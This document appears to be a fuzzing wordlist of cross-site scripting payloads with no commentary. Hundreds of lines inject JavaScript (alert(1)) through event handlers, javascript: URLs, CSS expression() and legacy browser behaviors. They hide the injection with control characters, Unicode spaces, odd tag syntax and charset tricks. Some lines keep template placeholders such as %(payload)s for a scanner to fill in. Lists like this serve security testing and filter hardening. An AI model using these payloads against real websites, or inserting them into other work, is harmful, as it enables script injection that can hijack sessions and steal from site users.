<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>
<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>
<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
<object onError object onError="javascript:javascript:alert(1)"></object onError>
<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>
<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
<body onload body onload="javascript:javascript:alert(1)"></body onload>
<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
\x3Cscript>javascript:alert(1)</script>
'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
<script>javascript:alert(1)</script\x0D
<script>javascript:alert(1)</script\x0A
<script>javascript:alert(1)</script\x0B
<script charset="\x22>javascript:alert(1)</script>
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
`"'><img src='#\x27 onerror=javascript:alert(1)>
<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
<script>/* *\x2A/javascript:alert(1)// */</script>
<script>/* *\x00/javascript:alert(1)// */</script>
<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E
<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
'`"><\x3Cscript>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
<script src="data:\xD4\x8F,javascript:alert(1)"></script>
<script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
<script src="data:\xCB\x8F,javascript:alert(1)"></script>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
ABC<div style="x:expression\x00(javascript:alert(1)">DEF
ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x09expression(javascript:alert(1)">DEF
ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
ABC<div style="x:\x20expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
ABC<div style="x:\x00expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
<a href="\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xC2\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\xA0\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE1\x9A\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE3\x80\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x80\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\xE2\x81\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x00:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x3A:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x09:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0D:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript\x0A:javascript:alert(1)" id="fuzzelement1">test</a>
`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
"`'><script>\x3Bjavascript:alert(1)</script>
"`'><script>\x0Djavascript:alert(1)</script>
"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
"`'><script>\xE2\x80\x81javascript:alert(1)</script>
"`'><script>\xE2\x80\x84javascript:alert(1)</script>
"`'><script>\xE3\x80\x80javascript:alert(1)</script>
"`'><script>\x09javascript:alert(1)</script>
"`'><script>\xE2\x80\x89javascript:alert(1)</script>
"`'><script>\xE2\x80\x85javascript:alert(1)</script>
"`'><script>\xE2\x80\x88javascript:alert(1)</script>
"`'><script>\x00javascript:alert(1)</script>
"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
"`'><script>\x0Cjavascript:alert(1)</script>
"`'><script>\x2Bjavascript:alert(1)</script>
"`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
"`'><script>-javascript:alert(1)</script>
"`'><script>\x0Ajavascript:alert(1)</script>
"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
"`'><script>\x7Ejavascript:alert(1)</script>
"`'><script>\xE2\x80\x87javascript:alert(1)</script>
"`'><script>\xE2\x81\x9Fjavascript:alert(1)</script>
"`'><script>\xE2\x80\xA9javascript:alert(1)</script>
"`'><script>\xC2\x85javascript:alert(1)</script>
"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x83javascript:alert(1)</script>
"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
"`'><script>\xE2\x80\x80javascript:alert(1)</script>
"`'><script>\x21javascript:alert(1)</script>
"`'><script>\xE2\x80\x82javascript:alert(1)</script>
"`'><script>\xE2\x80\x86javascript:alert(1)</script>
"`'><script>\xE1\xA0\x8Ejavascript:alert(1)</script>
"`'><script>\x0Bjavascript:alert(1)</script>
"`'><script>\x20javascript:alert(1)</script>
"`'><script>\xC2\xA0javascript:alert(1)</script>
"/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />
"/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />
"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
"/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />
"/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />
"/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />
"/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />
"/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />
"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
<script\x2F>javascript:alert(1)</script>
<script\x20>javascript:alert(1)</script>
<script\x0D>javascript:alert(1)</script>
<script\x0A>javascript:alert(1)</script>
<script\x0C>javascript:alert(1)</script>
<script\x00>javascript:alert(1)</script>
<script\x09>javascript:alert(1)</script>
`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
`"'><img src=xxx:x onerror\x00=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0D=javascript:alert(1)>
`"'><img src=xxx:x onerror\x20=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
<script>javascript:alert(1)<\x00/script>
<img src=# onerror\x3D"javascript:alert(1)" >
<input onfocus=javascript:alert(1) autofocus>
<input onblur=javascript:alert(1) autofocus><input autofocus>
<video poster=javascript:javascript:alert(1)//
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
<video><source onerror="javascript:javascript:alert(1)">
<video onerror="javascript:javascript:alert(1)"><source>
<form><button formaction="javascript:javascript:alert(1)">X
<body oninput=javascript:alert(1)><input autofocus>
<math href="javascript:javascript:alert(1)">CLICKME</math>  <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:javascript:alert(1)">CLICKME</maction> </math>
<frameset onload=javascript:alert(1)>
<table background="javascript:javascript:alert(1)">
<!--<img src="--><img src=x onerror=javascript:alert(1)//">
<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
<![><img src="]><img src=x onerror=javascript:alert(1)//">
<style><img src="</style><img src=x onerror=javascript:alert(1)//">
<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>
<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
<object data="data:text/html;base64,%(base64)s">
<embed src="data:text/html;base64,%(base64)s">
<b <script>alert(1)</script>0
<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
<embed src="javascript:alert(1)">
<img src="javascript:alert(1)">
<image src="javascript:alert(1)">
<script src="javascript:alert(1)">
<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
<? foo="><script>javascript:alert(1)</script>">
<! foo="><script>javascript:alert(1)</script>">
</ foo="><script>javascript:alert(1)</script>">
<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
<! foo="[[[Inception]]"><x foo="]foo><script>javascript:alert(1)</script>">
<% foo><x foo="%><script>javascript:alert(1)</script>">
<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
<img \x00src=x onerror="alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x11src=x onerror="javascript:alert(1)">
<img \x12src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x10src=x onerror="javascript:alert(1)">
<img\x13src=x onerror="javascript:alert(1)">
<img\x32src=x onerror="javascript:alert(1)">
<img\x47src=x onerror="javascript:alert(1)">
<img\x11src=x onerror="javascript:alert(1)">
<img \x47src=x onerror="javascript:alert(1)">
<img \x34src=x onerror="javascript:alert(1)">
<img \x39src=x onerror="javascript:alert(1)">
<img \x00src=x onerror="javascript:alert(1)">
<img src\x09=x onerror="javascript:alert(1)">
<img src\x10=x onerror="javascript:alert(1)">
<img src\x13=x onerror="javascript:alert(1)">
<img src\x32=x onerror="javascript:alert(1)">
<img src\x12=x onerror="javascript:alert(1)">
<img src\x11=x onerror="javascript:alert(1)">
<img src\x00=x onerror="javascript:alert(1)">
<img src\x47=x onerror="javascript:alert(1)">
<img src=x\x09onerror="javascript:alert(1)">
<img src=x\x10onerror="javascript:alert(1)">
<img src=x\x11onerror="javascript:alert(1)">
<img src=x\x12onerror="javascript:alert(1)">
<img src=x\x13onerror="javascript:alert(1)">
<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
<img src=x onerror=\x09"javascript:alert(1)">
<img src=x onerror=\x10"javascript:alert(1)">
<img src=x onerror=\x11"javascript:alert(1)">
<img src=x onerror=\x12"javascript:alert(1)">
<img src=x onerror=\x32"javascript:alert(1)">
<img src=x onerror=\x00"javascript:alert(1)">
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
<img src="x` `<script>javascript:alert(1)</script>"` `>
<img src onerror /" '"= alt=javascript:alert(1)//">
<title onpropertychange=javascript:alert(1)></title><title title=>
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
<!--[if]><script>javascript:alert(1)</script -->
<!--[if<img src=x onerror=javascript:alert(1)//]> -->
<script src="/\%(jscript)s"></script>
<script src="\\%(jscript)s"></script>
<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object> <object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="javascript:alert(1)" style="behavior:url(#x);"><param name=postdomevents /></object>
<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>
<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">XXX</a></a><a href="javascript:javascript:alert(1)">XXX</a>
<style>*[{}@import'%(css)s?]</style>X
<div style="font-family:'foo&#10;;color:red;';">XXX
<div style="font-family:foo}color=red;">XXX
<// style=x:expression\28javascript:alert(1)\29>
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>
<div style=content:url(%(svg)s)></div>
<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
<div id="x">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
<x style="background:url('x&#1;;color:red;/*')">XXX</x>
<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>
<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>
<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>
<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">XXX</a>
<x style="behavior:url(%(sct)s)">
<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>
<event-source src="%(event)s" onload="javascript:alert(1)">
<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">
<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;">
<script>%(payload)s</script>
<script src=%(jscript)s></script>
<script language='javascript' src='%(jscript)s'></script>
<script>javascript:alert(1)</script>
<IMG SRC="javascript:javascript:alert(1);">
<IMG SRC=javascript:javascript:alert(1)>
<IMG SRC=`javascript:javascript:alert(1)`>
<SCRIPT SRC=%(jscript)s?<B>
<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
<BODY ONLOAD=javascript:alert(1)>
<BODY ONLOAD=javascript:javascript:alert(1)>
<IMG SRC="jav    ascript:javascript:alert(1);">
<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>
<SCRIPT/SRC="%(jscript)s"></SCRIPT>
<<SCRIPT>%(payload)s//<</SCRIPT>
<IMG SRC="javascript:javascript:alert(1)"
<iframe src=%(scriptlet)s <
<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
<IMG DYNSRC="javascript:javascript:alert(1)">
<IMG LOWSRC="javascript:javascript:alert(1)">
<BGSOUND SRC="javascript:javascript:alert(1);">
<BR SIZE="&{javascript:alert(1)}">
<LAYER SRC="%(scriptlet)s"></LAYER>
<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
<STYLE>@import'%(css)s';</STYLE>
<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
<XSS STYLE="behavior: url(%(htc)s);">
<STYLE>li {list-style-image: url("javascript:javascript:alert(1)");}</STYLE><UL><LI>XSS
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
<IFRAME SRC="javascript:javascript:alert(1);"></IFRAME>
<TABLE BACKGROUND="javascript:javascript:alert(1)">
<TABLE><TD BACKGROUND="javascript:javascript:alert(1)">
<DIV STYLE="background-image: url(javascript:javascript:alert(1))">
<DIV STYLE="width:expression(javascript:alert(1));">
<IMG STYLE="xss:expr/*XSS*/ession(javascript:alert(1))">
<XSS STYLE="xss:expression(javascript:alert(1))">
<STYLE TYPE="text/javascript">javascript:alert(1);</STYLE>
<STYLE>.XSS{background-image:url("javascript:javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
<STYLE type="text/css">BODY{background:url("javascript:javascript:alert(1)")}</STYLE>
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->
<BASE HREF="javascript:javascript:alert(1);//">
<OBJECT TYPE="text/x-scriptlet" DATA="%(scriptlet)s"></OBJECT>
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>
>cript:javascript:alert(1)"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;"></BODY></HTML>
<SCRIPT SRC="%(jpg)s"></SCRIPT>
<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-
<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
